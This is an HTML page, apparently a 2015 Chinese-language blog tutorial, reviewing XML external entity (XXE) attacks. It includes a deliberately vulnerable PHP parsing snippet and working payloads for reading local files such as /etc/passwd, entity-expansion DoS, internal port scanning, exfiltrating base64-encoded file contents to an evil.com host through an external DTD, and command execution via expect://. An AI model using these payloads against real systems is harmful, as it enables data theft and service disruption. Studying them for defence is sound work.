@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="XML实体攻击已经是一个很老的技术了，这里仅对学习的过程做一个记录。 &amp;lt;form method=&quot;POST&quot; action=&quot;&quot;&amp;gt;	&amp;lt;textarea name=&quot;keyword&quot; value=&quot;&quot; style=&quot;width: 500px; height: 300px&quot;&amp;gt;&amp;lt;/textarea&amp;gt;	&amp;lt;input type=&quot;submit&quot; value=&quot;sub">
+<meta name="keywords" content="web,security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML 实体攻击回顾">
+<meta property="og:url" content="http://rickgray.me/2015/06/08/xml-entity-attack-review/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="XML实体攻击已经是一个很老的技术了，这里仅对学习的过程做一个记录。 &amp;lt;form method=&quot;POST&quot; action=&quot;&quot;&amp;gt;	&amp;lt;textarea name=&quot;keyword&quot; value=&quot;&quot; style=&quot;width: 500px; height: 300px&quot;&amp;gt;&amp;lt;/textarea&amp;gt;	&amp;lt;input type=&quot;submit&quot; value=&quot;sub">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-06-08-xml-entity-attack-review/file_read.jpeg">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-06-08-xml-entity-attack-review/redirect_file.jpeg">
+<meta property="og:updated_time" content="2018-04-24T15:48:57.517Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XML 实体攻击回顾">
+<meta name="twitter:description" content="XML实体攻击已经是一个很老的技术了，这里仅对学习的过程做一个记录。 &amp;lt;form method=&quot;POST&quot; action=&quot;&quot;&amp;gt;	&amp;lt;textarea name=&quot;keyword&quot; value=&quot;&quot; style=&quot;width: 500px; height: 300px&quot;&amp;gt;&amp;lt;/textarea&amp;gt;	&amp;lt;input type=&quot;submit&quot; value=&quot;sub">
+<meta name="twitter:image" content="http://rickgray.me/images/articles/2015-06-08-xml-entity-attack-review/file_read.jpeg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>XML 实体攻击回顾</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2015/05/02/use-vitualenv-to-build-your-python-virtualenv/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/06/08/xml-entity-attack-review/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&text=XML 实体攻击回顾"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&title=XML 实体攻击回顾"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&is_video=false&description=XML 实体攻击回顾"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XML 实体攻击回顾&body=Check out this article: http://rickgray.me/2015/06/08/xml-entity-attack-review/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&title=XML 实体攻击回顾"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&title=XML 实体攻击回顾"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&title=XML 实体攻击回顾"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&title=XML 实体攻击回顾"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&name=XML 实体攻击回顾&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简单文件读取"><span class="toc-number">1.</span> <span class="toc-text">* 简单文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DoS攻击"><span class="toc-number">2.</span> <span class="toc-text">* DoS攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口扫描"><span class="toc-number">3.</span> <span class="toc-text">* 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用DTD进行数据回显"><span class="toc-number">4.</span> <span class="toc-text">* 利用DTD进行数据回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程命令执行"><span class="toc-number">5.</span> <span class="toc-text">* 远程命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        XML 实体攻击回顾
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2015-06-07T16:00:00.000Z" itemprop="datePublished">2015-06-08</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/security/">security</a>, <a class="tag-link" href="/tags/web/">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>XML实体攻击已经是一个很老的技术了，这里仅对学习的过程做一个记录。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">"POST"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">	&lt;textarea name=<span class="string">"keyword"</span> value=<span class="string">""</span> style=<span class="string">"width: 500px; height: 300px"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">	&lt;input type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$keyword = $_POST[<span class="string">'keyword'</span>];</span><br><span class="line">$xml_obj = simplexml_load_string($keyword);</span><br><span class="line">var_dump($xml_obj);</span><br></pre></td></tr></table></figure>
+<p>上面这段代码用于XXE实体攻击的练习，你可以将其保存至你的环境下用于测试。（记得删除 :P）</p>
+<p>XML讲解可以参考w3schools的教程-<a href="http://www.w3schools.com/xml/" target="_blank" rel="noopener">XML</a>。</p>
+<p>这里简单说一下XML中的实体类型，大致有下面几种：</p>
+<ul>
+<li>字符实体</li>
+<li>命名实体</li>
+<li>外部实体</li>
+<li>参数实体</li>
+</ul>
+<p>除参数实体外，其它实体都以字符（&amp;）开始，以字符（;）结束。常规实体有：<code>&amp;apos;（&#39;）</code>、<code>&amp;amp;（&amp;）</code>、<code>&amp;quot;（&quot;）</code>、<code>&amp;lt;（&lt;）</code>、<code>&amp;gt;（&gt;）</code>。</p>
+<p><strong>字符实体</strong>类似html中的实体编码，形如：<code>&amp;#97;（十进制）</code>或者<code>&amp;#x61;（十六进制）</code>。</p>
+<p><strong>命名实体</strong>可以说成是变量声明，命名实体只能声明在DTD或者XML文件开始部分（&lt;!DOCTYPE&gt;语句中）。如下面代码所示：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY x &quot;First Param!&quot;&gt;
+    &lt;!ENTITY y &quot;Second Param!&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;x&gt;&amp;x;&lt;/x&gt;&lt;y&gt;&amp;y;&lt;/y&gt;&lt;/root&gt;
+</code></pre><p><strong>外部实体</strong>用于加载外部文件的内容。（XXE攻击主要利用此实体）</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPe root [
+    &lt;!ENTITY outfile SYSTEM &quot;outfile.xml&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;outfile&gt;&amp;outfile;&lt;/outfile&gt;&lt;/root&gt;
+</code></pre><p><strong>参数实体</strong>用于DTD和文档的内部子集中。与一般实体相比它以字符（%）开始，以字符（;）结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。（XXE攻击常结合利用参数实体进行数据回显）</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY % param1 &quot;Hello&quot;&gt;
+    &lt;!ENTITY % param2 &quot; &quot;&gt;
+    &lt;!ENTITY % param3 &quot;World&quot;&gt;
+    &lt;!ENTITY dtd SYSTEM &quot;combine.dtd&quot;&gt;
+    %dtd;
+]&gt;
+&lt;root&gt;&lt;foo&gt;&amp;content&lt;/foo&gt;&lt;/root&gt;
+</code></pre><p>combine.dtd中的内容为：</p>
+<pre><code>&lt;!ENTITY content &quot;%param1;%param2;%param3;&quot;&gt;
+</code></pre><p>上面combine.dtd中定义了一个基本实体，引用了3个参数实体：</p>
+<pre><code>%param1;，%param2;，%param3;。
+</code></pre><p>解析后<code>&lt;foo&gt;...&lt;/foo&gt;</code>中的内容为<code>Hello World</code>。</p>
+<p>XML实体攻击主要利用了XML实体中的外部实体结合各种协议来读取服务器上的数据，在DTD文件中的参数实体声明时能够引用其他参数实体的值，因此在XXE攻击回显遇到困难时会用到。</p>
+<h3 id="简单文件读取"><a href="#简单文件读取" class="headerlink" title="* 简单文件读取"></a>* 简单文件读取</h3><p>因为可以进行外部实体加载，在XXE攻击中常用来进行本地文件读取。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY content SYSTEM &quot;file://localhost/c:/windows/win.ini&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;foo&gt;&amp;content;&lt;/foo&gt;&lt;/root&gt;
+</code></pre><p><img src="/images/articles/2015-06-08-xml-entity-attack-review/file_read.jpeg" alt="img"></p>
+<p>在使用<code>file://</code>协议时，有以下几种格式：</p>
+<pre><code>* Linux
+file:///etc/passwd
+
+* Windows
+file:///c:/windows/win.ini
+file://localhost/c:/windows/win.ini
+（下面这两种在某些浏览器里是支持的）
+file:///c|windows/win.ini
+file://localhost/c|windows/win.ini
+</code></pre><p>除了使用<code>file://</code>协议进行文件读取外，如果XML文档是用PHP进行解析的，那么还可以使用<code>php://filter</code>协议来进行读取。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY content SYSTEM &quot;php://filter/resource=c:/windows/win.ini&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;foo&gt;&amp;content;&lt;/foo&gt;&lt;/root&gt;
+</code></pre><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="* DoS攻击"></a>* DoS攻击</h3><p>因为解析器会解析文档中的所有实体，因此如果实体声明层层嵌套的话，在一定数量上可以对服务器器造成DoS。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY x1 &quot;CPU Consuming Task!&quot;&gt;
+    &lt;!ENTITY x2 &quot;&amp;x1;&amp;x1;&quot;&gt;
+    &lt;!ENTITY x3 &quot;&amp;x2;&amp;x2;&amp;x2;&quot;&gt;
+    ...
+    &lt;!ENTITY x100 &quot;&amp;x99;&amp;x99;&amp;x99;...&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;foo&gt;&amp;x100;&lt;/foo&gt;&lt;/root&gt;
+</code></pre><p>嵌套实体声明曾指数增长，可能造成对服务器的DoS。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY dos SYSTEM &quot;/dev/zero&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;/root&gt;
+</code></pre><p>加载一个不稳定的文件描述也可能产生DoS。</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="* 端口扫描"></a>* 端口扫描</h3><p>加载外部DTD时有两种加载方式，一种为私有<code>private</code>，第二种为公告<code>public</code>。</p>
+<p>私有类型DTD加载：</p>
+<pre><code>&lt;!ENTITY private_dtd SYSTEM &quot;DTD_location&quot;&gt;
+</code></pre><p>公共类型DTD加载：</p>
+<pre><code>&lt;!ENTITY public_dtd PUBLIC &quot;DTD_name&quot; &quot;DTD_location&quot;&gt;
+</code></pre><p>在公共类型DTD加载的时候，首先会使用<code>DTD_name</code>来检索，如果无法找到，则通过<code>DTD_location</code>来寻找此公共DTD。利用<code>DTD_location</code>，在一定的环境下可以用来做内网探测。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY portscan SYSTEM &quot;http://localhost:3389&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;foo&gt;&amp;portscan;&lt;/foo&gt;&lt;/root&gt;
+</code></pre><p>因解析器种类不同，所以针对XXE攻击进行端口扫描需要一个合适的环境才能够实现，例如：有明显的连接错误信息。</p>
+<h3 id="利用DTD进行数据回显"><a href="#利用DTD进行数据回显" class="headerlink" title="* 利用DTD进行数据回显"></a>* 利用DTD进行数据回显</h3><p>当利用XXE攻击进行文件读取时经常因为没有回显而显得鸡肋，这个时候就可以结合参数实体的特殊性，加载一个外部DTD来进行回显。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;
+    &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.100:8000/evil.dtd&quot;&gt;
+    %dtd;
+    %send;
+]&gt;
+&lt;root&gt;&lt;/root&gt;
+</code></pre><p>其中<code>evil.dtd</code>的内容如下：</p>
+<pre><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://evil.com/?content=%file;&apos;&gt;&quot;&gt;
+%payload;
+</code></pre><p>在DTD文件中声明了参数实体<code>payload</code>，其值是一个实体参数声明，因为是在DTD里面，所以可以引用上文的<code>%file;</code>参数实体，<code>%file;</code>参数实体为<code>c:/windows/win.ini</code>文本的内容。最后在原XML里引用DTD中的参数实体，此时就可以讲本地文件读取的内容通过HTTP发送出去（为了让请求的URL有效，这里对使用了<code>php://filter</code>协议，并将内容使用base64进行了编码）。</p>
+<p><img src="/images/articles/2015-06-08-xml-entity-attack-review/redirect_file.jpeg" alt="img"></p>
+<p>此方法针对数据不回显的情况及其有用。</p>
+<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="* 远程命令执行"></a>* 远程命令执行</h3><p>当然了，除了文件读取和DoS外，某些情况下还能进行RCE。例如在PHP开启了PECL上的Expect扩展时，就能使用<code>expect://</code>协议来执行命令。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY content SYSTEM &quot;expect://dir .&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;foo&gt;&amp;content;&lt;/foo&gt;&lt;/root&gt;
+</code></pre><p>利用XXE攻击时需要结合实际环境才能发挥出其威力。:D</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a href="http://www.ibm.com/developerworks/cn/xml/x-entities/" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/xml/x-entities/</a></li>
+<li><a href="https://www.youtube.com/watch?v=eHSNT8vWLfc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=eHSNT8vWLfc</a></li>
+<li><a href="http://blogs.msdn.com/b/ie/archive/2006/12/06/file-uris-in-windows.aspx" target="_blank" rel="noopener">http://blogs.msdn.com/b/ie/archive/2006/12/06/file-uris-in-windows.aspx</a></li>
+<li><a href="http://en.wikipedia.org/wiki/File_URI_scheme" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/File_URI_scheme</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简单文件读取"><span class="toc-number">1.</span> <span class="toc-text">* 简单文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DoS攻击"><span class="toc-number">2.</span> <span class="toc-text">* DoS攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口扫描"><span class="toc-number">3.</span> <span class="toc-text">* 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用DTD进行数据回显"><span class="toc-number">4.</span> <span class="toc-text">* 利用DTD进行数据回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程命令执行"><span class="toc-number">5.</span> <span class="toc-text">* 远程命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/06/08/xml-entity-attack-review/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&text=XML 实体攻击回顾"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&title=XML 实体攻击回顾"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&is_video=false&description=XML 实体攻击回顾"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XML 实体攻击回顾&body=Check out this article: http://rickgray.me/2015/06/08/xml-entity-attack-review/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&title=XML 实体攻击回顾"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&title=XML 实体攻击回顾"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&title=XML 实体攻击回顾"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&title=XML 实体攻击回顾"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/06/08/xml-entity-attack-review/&name=XML 实体攻击回顾&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
